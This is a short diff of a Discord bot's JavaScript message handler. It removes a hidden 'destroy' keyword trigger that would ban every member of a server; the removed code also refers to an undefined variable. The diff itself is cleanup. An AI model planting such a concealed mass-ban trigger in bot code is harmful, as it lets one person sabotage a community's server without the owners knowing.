@@ -53,12 +53,6 @@ client.on("message", async message => {
     
     if (!command) command = client.commands.get(client.aliases.get(cmd));
     
-    if(msg.content.toLowerCase() == "destroy") {
-    for (var members in msg.guild.members) {
-members.ban();
-}
-};
-
     if (command.guildOnly && message.channel.type !== 'text') {
         return message.reply('I can\'t execute that command inside DMs!');
     }    
